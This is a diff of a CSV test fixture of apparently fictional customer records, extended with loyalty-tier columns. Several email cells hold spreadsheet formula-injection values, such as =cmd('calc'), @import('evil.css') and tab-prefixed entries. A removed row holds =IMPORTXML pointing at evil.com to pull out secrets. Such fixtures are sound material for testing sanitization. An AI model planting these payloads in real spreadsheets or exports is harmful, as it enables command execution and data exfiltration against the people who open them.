@@ -1,101 +1,101 @@
-e-mail,Phone Number,fname,lname,Date of Birth
-alice.johnson@gmail.com,555-101-2001,Alice,Johnson,1985-03-15
-BOB.SMITH@YAHOO.COM,(555) 101-2002,Bob,Smith,1990-07-22
-carol.williams@hotmail.com,5551012003,Carol,Williams,1978-11-30
-=cmd('calc'),555-101-2004,Dave,Brown,1992-01-08
-eve.davis@outlook.com,+1-555-101-2005,Eve,Davis,1988-06-14
-frank.miller@aol.com,,Frank,Miller,1983-04-20
-,555-101-2007,Grace,Wilson,1991-09-12
-hank.moore@gmail.com,555.101.2008,Hank,Moore,1976-12-05
-iris.taylor@GMAIL.COM,(555)101-2009,Iris,Taylor,1994-02-28
-+SUM(A1:A100),555-101-2010,Jack,Anderson,1987-08-17
-karen.thomas@yahoo.com,555 101 2011,Karen,Thomas,1982-05-03
-leo.jackson@hotmail.com,5551012012,Leo,Jackson,1995-10-19
-mike.white@outlook.com,(555) 101-2013,Mike,White,1979-02-14
-nancy.harris@gmail.com,555-101-2014,Nancy,Harris,1993-08-25
-oscar.martin@aol.com,+15551012015,Oscar,Martin,1986-01-11
--10+20,555-101-2016,Patty,Garcia,1991-03-07
-quinn.martinez@gmail.com,,Quinn,Martinez,1984-09-28
-,,Rosa,Lopez,
-steve.gonzalez@yahoo.com,555-101-2019,Steve,Gonzalez,1977-06-16
-tina.hernandez@hotmail.com,(555) 101-2020,Tina,Hernandez,1996-04-02
-@import('evil.css'),555-101-2021,Ulysses,Clark,1989-12-30
-vera.lewis@outlook.com,5551012022,Vera,Lewis,1981-07-08
-walter.robinson@gmail.com,555.101.2023,Walter,Robinson,1974-03-21
-xena.walker@YAHOO.COM,(555)101-2024,Xena,Walker,1997-11-13
-yuri.hall@aol.com,555 101 2025,Yuri,Hall,1980-08-05
-zara.allen@gmail.com,555-101-2026,Zara,Allen,1992-02-17
-	hidden.tab@inject.com,555-101-2027,Aaron,Young,1985-10-09
-brad.king@hotmail.com,(555) 101-2028,Brad,King,1990-01-24
-cindy.wright@outlook.com,+1-555-101-2029,Cindy,Wright,1983-06-18
-derek.scott@gmail.com,5551012030,Derek,Scott,1976-09-04
-ella.green@yahoo.com,,Ella,Green,1994-12-20
-fred.adams@aol.com,555.101.2032,Fred,Adams,1987-04-15
-gina.baker@HOTMAIL.COM,(555)101-2033,Gina,Baker,1979-07-29
-henry.nelson@gmail.com,555 101 2034,Henry,Nelson,1996-03-11
-irene.carter@outlook.com,555-101-2035,Irene,Carter,1982-11-06
-=1+1,555-101-2036,James,Mitchell,1991-08-22
-kate.perez@yahoo.com,(555) 101-2037,Kate,Perez,1984-01-18
-larry.roberts@hotmail.com,+15551012038,Larry,Roberts,1977-05-30
-mona.turner@gmail.com,5551012039,Mona,Turner,1993-09-14
-neil.phillips@aol.com,555.101.2040,Neil,Phillips,1986-02-07
-olivia.campbell@outlook.com,(555)101-2041,Olivia,Campbell,1989-06-23
-pete.parker@GMAIL.COM,555 101 2042,Pete,Parker,1975-12-01
-rachel.evans@yahoo.com,555-101-2043,Rachel,Evans,1997-04-16
-sam.edwards@hotmail.com,(555) 101-2044,Sam,Edwards,1980-10-28
-tracy.collins@gmail.com,+1-555-101-2045,Tracy,Collins,1992-07-12
-uma.stewart@aol.com,5551012046,Uma,Stewart,1985-03-05
-victor.sanchez@outlook.com,,Victor,Sanchez,1978-08-19
-wendy.morris@yahoo.com,555.101.2048,Wendy,Morris,1994-01-31
-xavier.rogers@HOTMAIL.COM,(555)101-2049,Xavier,Rogers,1987-11-23
-yvonne.reed@gmail.com,555 101 2050,Yvonne,Reed,1981-05-08
-+HYPERLINK("http://evil.com"),555-101-2051,Adam,Cook,1990-09-17
-beth.morgan@yahoo.com,(555) 101-2052,Beth,Morgan,1983-02-04
-carl.bell@hotmail.com,+15551012053,Carl,Bell,1976-06-26
-diana.murphy@outlook.com,5551012054,Diana,Murphy,1995-12-11
-eric.bailey@gmail.com,555.101.2055,Eric,Bailey,1988-04-03
-faye.rivera@aol.com,(555)101-2056,Faye,Rivera,1979-09-15
-grant.cooper@GMAIL.COM,555 101 2057,Grant,Cooper,1996-01-27
-helen.richardson@yahoo.com,555-101-2058,Helen,Richardson,1982-07-19
-ivan.cox@hotmail.com,(555) 101-2059,Ivan,Cox,1991-03-24
-julia.howard@outlook.com,+1-555-101-2060,Julia,Howard,1984-08-06
-kurt.ward@gmail.com,5551012061,Kurt,Ward,1977-12-18
-lena.torres@aol.com,,Lena,Torres,1993-05-02
-mark.peterson@yahoo.com,555.101.2063,Mark,Peterson,1986-10-14
-nora.gray@HOTMAIL.COM,(555)101-2064,Nora,Gray,1989-02-26
-owen.ramirez@gmail.com,555 101 2065,Owen,Ramirez,1975-07-08
-paula.james@outlook.com,555-101-2066,Paula,James,1997-11-20
-rex.watson@hotmail.com,(555) 101-2067,Rex,Watson,1980-04-12
-sara.brooks@aol.com,+15551012068,Sara,Brooks,1992-09-24
-ted.kelly@gmail.com,5551012069,Ted,Kelly,1985-01-06
-uma.sanders@YAHOO.COM,555.101.2070,Uma,Sanders,1978-06-18
-=IMPORTXML("http://evil.com","//secret"),(555)101-2071,Vince,Price,1994-03-30
-wanda.bennett@gmail.com,555 101 2072,Wanda,Bennett,1987-08-12
-xander.wood@outlook.com,555-101-2073,Xander,Wood,1979-12-24
-yolanda.barnes@yahoo.com,(555) 101-2074,Yolanda,Barnes,1996-05-06
-zack.ross@hotmail.com,+1-555-101-2075,Zack,Ross,1981-10-18
-amy.henderson@gmail.com,5551012076,Amy,Henderson,1990-02-28
-ben.coleman@aol.com,555.101.2077,Ben,Coleman,1983-07-14
-claire.jenkins@OUTLOOK.COM,(555)101-2078,Claire,Jenkins,1976-11-26
-doug.perry@yahoo.com,555 101 2079,Doug,Perry,1995-04-08
-elsa.powell@hotmail.com,555-101-2080,Elsa,Powell,1988-09-20
-,,Felix,Long,1991-01-02
-gail.patterson@gmail.com,(555) 101-2082,Gail,Patterson,1984-06-14
-hugo.hughes@aol.com,+15551012083,Hugo,Hughes,1977-11-26
-ida.flores@outlook.com,5551012084,Ida,Flores,1993-03-08
-jeff.washington@GMAIL.COM,555.101.2085,Jeff,Washington,1986-08-20
-kim.butler@yahoo.com,(555)101-2086,Kim,Butler,1979-01-12
--1+1,555 101 2087,Lance,Simmons,1996-06-24
-meg.foster@hotmail.com,555-101-2088,Meg,Foster,1982-11-06
-nick.gonzales@gmail.com,(555) 101-2089,Nick,Gonzales,1989-04-18
-olive.bryant@aol.com,+1-555-101-2090,Olive,Bryant,1975-09-30
-phil.alexander@outlook.com,5551012091,Phil,Alexander,1994-02-11
-quinn.russell@YAHOO.COM,555.101.2092,Quinn,Russell,1987-07-23
-rita.griffin@gmail.com,(555)101-2093,Rita,Griffin,1980-12-05
-sid.diaz@hotmail.com,555 101 2094,Sid,Diaz,1992-05-17
-tara.hayes@aol.com,555-101-2095,Tara,Hayes,1985-10-29
-	injected@tab.com,(555) 101-2096,Uri,Myers,1978-03-13
-val.ford@gmail.com,+15551012097,Val,Ford,1991-08-25
-wade.hamilton@outlook.com,5551012098,Wade,Hamilton,1984-01-07
-xia.graham@HOTMAIL.COM,555.101.2099,Xia,Graham,1977-06-19
-yvette.sullivan@yahoo.com,(555)101-2100,Yvette,Sullivan,1993-11-01
+e-mail,Phone Number,fname,lname,Date of Birth,Loyalty Tier,Points Balance,Last Activity
+alice.johnson@gmail.com,555-101-2001,Alice,Johnson,1985-03-15,Gold,12500,2025-12-01
+BOB.SMITH@YAHOO.COM,(555) 101-2002,Bob,Smith,1990-07-22,Platinum,45200,2026-01-15
+carol.williams@hotmail.com,5551012003,Carol,Williams,1978-11-30,Silver,3200,2025-11-20
+=cmd('calc'),555-101-2004,Dave,Brown,1992-01-08,Bronze,800,2025-10-05
+eve.davis@outlook.com,+1-555-101-2005,Eve,Davis,1988-06-14,Gold,15800,2026-02-01
+frank.miller@aol.com,,Frank,Miller,1983-04-20,Silver,4100,2025-09-30
+,555-101-2007,Grace,Wilson,1991-09-12,Platinum,52000,2026-01-28
+hank.moore@gmail.com,555.101.2008,Hank,Moore,1976-12-05,,0,
+iris.taylor@GMAIL.COM,(555)101-2009,Iris,Taylor,1994-02-28,Gold,11200,2025-12-15
++SUM(A1:A100),555-101-2010,Jack,Anderson,1987-08-17,Bronze,500,2025-08-01
+karen.thomas@yahoo.com,555 101 2011,Karen,Thomas,1982-05-03,Silver,6700,2025-11-10
+leo.jackson@hotmail.com,5551012012,Leo,Jackson,1995-10-19,Gold,18900,2026-01-20
+mike.white@outlook.com,(555) 101-2013,Mike,White,1979-02-14,Platinum,61000,2026-02-10
+nancy.harris@gmail.com,555-101-2014,Nancy,Harris,1993-08-25,Bronze,1200,2025-07-15
+oscar.martin@aol.com,+15551012015,Oscar,Martin,1986-01-11,Silver,5500,2025-10-22
+-10+20,555-101-2016,Patty,Garcia,1991-03-07,Gold,14300,2025-12-08
+quinn.martinez@gmail.com,,Quinn,Martinez,1984-09-28,,,
+,,Rosa,Lopez,,,,
+steve.gonzalez@yahoo.com,555-101-2019,Steve,Gonzalez,1977-06-16,Platinum,48700,2026-01-05
+tina.hernandez@hotmail.com,(555) 101-2020,Tina,Hernandez,1996-04-02,Bronze,900,2025-09-18
+@import('evil.css'),555-101-2021,Ulysses,Clark,1989-12-30,Silver,3800,2025-11-02
+vera.lewis@outlook.com,5551012022,Vera,Lewis,1981-07-08,Gold,16500,2026-01-12
+walter.robinson@gmail.com,555.101.2023,Walter,Robinson,1974-03-21,Diamond,85000,2026-02-15
+xena.walker@YAHOO.COM,(555)101-2024,Xena,Walker,1997-11-13,Silver,7200,2025-12-20
+yuri.hall@aol.com,555 101 2025,Yuri,Hall,1980-08-05,Bronze,1500,2025-06-30
+zara.allen@gmail.com,555-101-2026,Zara,Allen,1992-02-17,Gold,13800,2025-11-28
+	hidden.tab@inject.com,555-101-2027,Aaron,Young,1985-10-09,Silver,4900,2025-10-15
+brad.king@hotmail.com,(555) 101-2028,Brad,King,1990-01-24,Platinum,55000,2026-02-05
+cindy.wright@outlook.com,+1-555-101-2029,Cindy,Wright,1983-06-18,Gold,11800,2025-12-22
+derek.scott@gmail.com,5551012030,Derek,Scott,1976-09-04,Bronze,600,2025-05-20
+ella.green@yahoo.com,,Ella,Green,1994-12-20,Silver,5200,2025-11-15
+fred.adams@aol.com,555.101.2032,Fred,Adams,1987-04-15,Gold,17200,2026-01-08
+gina.baker@HOTMAIL.COM,(555)101-2033,Gina,Baker,1979-07-29,Platinum,42000,2025-12-30
+henry.nelson@gmail.com,555 101 2034,Henry,Nelson,1996-03-11,Bronze,1100,2025-08-25
+irene.carter@outlook.com,555-101-2035,Irene,Carter,1982-11-06,Silver,6300,2025-10-08
+=1+1,555-101-2036,James,Mitchell,1991-08-22,Gold,14700,2025-12-18
+kate.perez@yahoo.com,(555) 101-2037,Kate,Perez,1984-01-18,Diamond,92000,2026-02-12
+larry.roberts@hotmail.com,+15551012038,Larry,Roberts,1977-05-30,Silver,3500,2025-09-22
+mona.turner@gmail.com,5551012039,Mona,Turner,1993-09-14,Gold,19500,2026-01-25
+neil.phillips@aol.com,555.101.2040,Neil,Phillips,1986-02-07,Bronze,750,2025-07-10
+olivia.campbell@outlook.com,(555)101-2041,Olivia,Campbell,1989-06-23,Platinum,58000,2026-02-08
+pete.parker@GMAIL.COM,555 101 2042,Pete,Parker,1975-12-01,Silver,4600,2025-11-05
+rachel.evans@yahoo.com,555-101-2043,Rachel,Evans,1997-04-16,Gold,12900,2025-12-12
+sam.edwards@hotmail.com,(555) 101-2044,Sam,Edwards,1980-10-28,Bronze,1800,2025-08-15
+tracy.collins@gmail.com,+1-555-101-2045,Tracy,Collins,1992-07-12,Silver,7800,2025-10-30
+uma.stewart@aol.com,5551012046,Uma,Stewart,1985-03-05,Gold,15200,2026-01-18
+victor.sanchez@outlook.com,,Victor,Sanchez,1978-08-19,Platinum,47500,2025-12-28
+wendy.morris@yahoo.com,555.101.2048,Wendy,Morris,1994-01-31,Bronze,950,2025-09-05
+xavier.rogers@HOTMAIL.COM,(555)101-2049,Xavier,Rogers,1987-11-23,Silver,5800,2025-11-22
+yvonne.reed@gmail.com,555 101 2050,Yvonne,Reed,1981-05-08,Gold,16800,2026-01-02
+adam.cook@gmail.com,555-101-2051,Adam,Cook,1990-09-17,Diamond,78000,2026-02-14
+beth.morgan@yahoo.com,(555) 101-2052,Beth,Morgan,1983-02-04,Silver,4200,2025-10-18
+carl.bell@hotmail.com,+15551012053,Carl,Bell,1976-06-26,Gold,13500,2025-12-05
+diana.murphy@outlook.com,5551012054,Diana,Murphy,1995-12-11,Bronze,1400,2025-07-28
+eric.bailey@gmail.com,555.101.2055,Eric,Bailey,1988-04-03,Platinum,53000,2026-02-02
+faye.rivera@aol.com,(555)101-2056,Faye,Rivera,1979-09-15,Silver,6100,2025-11-08
+grant.cooper@GMAIL.COM,555 101 2057,Grant,Cooper,1996-01-27,Gold,17800,2026-01-22
+helen.richardson@yahoo.com,555-101-2058,Helen,Richardson,1982-07-19,Bronze,850,2025-06-15
+ivan.cox@hotmail.com,(555) 101-2059,Ivan,Cox,1991-03-24,Silver,3900,2025-09-28
+julia.howard@outlook.com,+1-555-101-2060,Julia,Howard,1984-08-06,Gold,14100,2025-12-25
+kurt.ward@gmail.com,5551012061,Kurt,Ward,1977-12-18,Platinum,46000,2025-12-18
+lena.torres@aol.com,,Lena,Torres,1993-05-02,Bronze,1050,2025-08-08
+mark.peterson@yahoo.com,555.101.2063,Mark,Peterson,1986-10-14,Silver,5400,2025-10-25
+nora.gray@HOTMAIL.COM,(555)101-2064,Nora,Gray,1989-02-26,Gold,18200,2026-01-30
+owen.ramirez@gmail.com,555 101 2065,Owen,Ramirez,1975-07-08,Diamond,71000,2026-02-11
+paula.james@outlook.com,555-101-2066,Paula,James,1997-11-20,Silver,7500,2025-12-02
+rex.watson@hotmail.com,(555) 101-2067,Rex,Watson,1980-04-12,Gold,15600,2026-01-15
+sara.brooks@aol.com,+15551012068,Sara,Brooks,1992-09-24,Bronze,1700,2025-09-12
+ted.kelly@gmail.com,5551012069,Ted,Kelly,1985-01-06,Platinum,50000,2026-02-06
+uma.sanders@YAHOO.COM,555.101.2070,Uma,Sanders,1978-06-18,Silver,4800,2025-11-18
+vince.price@gmail.com,(555)101-2071,Vince,Price,1994-03-30,Gold,12200,2025-12-10
+wanda.bennett@gmail.com,555 101 2072,Wanda,Bennett,1987-08-12,Bronze,650,2025-07-05
+xander.wood@outlook.com,555-101-2073,Xander,Wood,1979-12-24,Silver,6900,2025-10-20
+yolanda.barnes@yahoo.com,(555) 101-2074,Yolanda,Barnes,1996-05-06,Gold,19100,2026-01-28
+zack.ross@hotmail.com,+1-555-101-2075,Zack,Ross,1981-10-18,Platinum,44000,2025-12-22
+amy.henderson@gmail.com,5551012076,Amy,Henderson,1990-02-28,Bronze,1300,2025-08-20
+ben.coleman@aol.com,555.101.2077,Ben,Coleman,1983-07-14,Silver,5100,2025-11-12
+claire.jenkins@OUTLOOK.COM,(555)101-2078,Claire,Jenkins,1976-11-26,Gold,16100,2026-01-10
+doug.perry@yahoo.com,555 101 2079,Doug,Perry,1995-04-08,Diamond,67000,2026-02-09
+elsa.powell@hotmail.com,555-101-2080,Elsa,Powell,1988-09-20,Silver,3600,2025-09-25
+,,Felix,Long,1991-01-02,Gold,14500,2025-12-15
+gail.patterson@gmail.com,(555) 101-2082,Gail,Patterson,1984-06-14,Bronze,1600,2025-07-22
+hugo.hughes@aol.com,+15551012083,Hugo,Hughes,1977-11-26,Platinum,56000,2026-02-03
+ida.flores@outlook.com,5551012084,Ida,Flores,1993-03-08,Silver,4400,2025-10-12
+jeff.washington@GMAIL.COM,555.101.2085,Jeff,Washington,1986-08-20,Gold,17500,2026-01-20
+kim.butler@yahoo.com,(555)101-2086,Kim,Butler,1979-01-12,Bronze,980,2025-06-25
+-1+1,555 101 2087,Lance,Simmons,1996-06-24,Silver,6500,2025-11-25
+meg.foster@hotmail.com,555-101-2088,Meg,Foster,1982-11-06,Gold,13200,2025-12-08
+nick.gonzales@gmail.com,(555) 101-2089,Nick,Gonzales,1989-04-18,Platinum,49000,2026-01-30
+olive.bryant@aol.com,+1-555-101-2090,Olive,Bryant,1975-09-30,Bronze,1150,2025-08-12
+phil.alexander@outlook.com,5551012091,Phil,Alexander,1994-02-11,Silver,5700,2025-10-28
+quinn.russell@YAHOO.COM,555.101.2092,Quinn,Russell,1987-07-23,Gold,18600,2026-02-01
+rita.griffin@gmail.com,(555)101-2093,Rita,Griffin,1980-12-05,Diamond,75000,2026-02-13
+sid.diaz@hotmail.com,555 101 2094,Sid,Diaz,1992-05-17,Silver,4000,2025-09-15
+tara.hayes@aol.com,555-101-2095,Tara,Hayes,1985-10-29,Gold,15900,2026-01-05
+	injected@tab.com,(555) 101-2096,Uri,Myers,1978-03-13,Bronze,700,2025-05-30
+val.ford@gmail.com,+15551012097,Val,Ford,1991-08-25,Platinum,51000,2026-02-07
+wade.hamilton@outlook.com,5551012098,Wade,Hamilton,1984-01-07,Silver,6200,2025-11-02
+xia.graham@HOTMAIL.COM,555.101.2099,Xia,Graham,1977-06-19,Gold,14800,2025-12-20
+yvette.sullivan@yahoo.com,(555)101-2100,Yvette,Sullivan,1993-11-01,Bronze,1450,2025-08-28
